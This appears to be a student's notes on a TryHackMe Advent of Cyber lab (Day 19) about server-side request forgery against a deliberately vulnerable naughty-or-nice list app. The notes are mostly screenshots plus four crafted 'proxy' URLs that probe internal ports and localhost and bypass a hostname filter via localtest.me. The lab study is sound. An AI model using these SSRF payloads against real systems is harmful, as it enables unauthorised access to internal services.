# Day 19 | The Naughty or Nice List

`TryHackMe` `Web` `SSRF`

---

## Learning Outcomes

## Story 
> Santa has released a web app that lets the children of the world check whether they are currently on the naughty or nice list. Unfortunately, the elf who coded it exposed more things than she thought. Can you access the list administration and ensure that every child gets a present from Santa this year?

Feel free to try hacking this web app on your own, or follow the instructions below! Note: when bypassing the hostname filter, use localtest.me otherwise your attempts won't work!


## Notes


![0ec016e3d194c46d075c2077a24e7cc8.png](./_resources/679e206039464bd7b793abc591402c14.png)

![ecc04a1b47c5498d2d3086744519df87.png](./_resources/56adb873028f4d3d91d6c4b9af8a9a59.png)

```
http://localhost/?proxy=http%3A%2F%2Flist.hohoho%3A80%2Fsearch.php%3Fname%3Dadmin
```

![b7cc2f26fa00e1dae9ac029154e1c64c.png](./_resources/13a149e028da4cd7a918bbad2340e717.png)

```
http://localhost/?proxy=http%3A%2F%2Flist.hohoho%3A22%2Fsearch.php%3Fname%3Dadmin
```

![a925a9231851a018cbe57319c3e7f662.png](./_resources/7c8fc75f43594f33ac7280dab3beb0c3.png)

```
http://localhost/?proxy=http%3A%2F%2Flocalhost%2Fsearch.php%3Fname%3Dadmin
```
![04efcb85d05be61f0f70327328f23b2b.png](./_resources/ae76c78cfa72493f85fea14790aa29e3.png)

```
http://localhost/?proxy=http%3A%2F%2Flist.hohoho.localtest.me
```
![9d055aaebd834344720878d5e04d72da.png](./_resources/353d1383c43241579fa671b2ad1155ac.png)


![fbd8b487c22411d5af71f5178ee14333.png](./_resources/ddf00bcd1e3c45d4b075764de19040f4.png)

![7913173661db4fa7687531b39bbf1958.png](./_resources/cc72ae0e5c424facae8b6295f2a8489b.png)

### Challenge


### Q1 


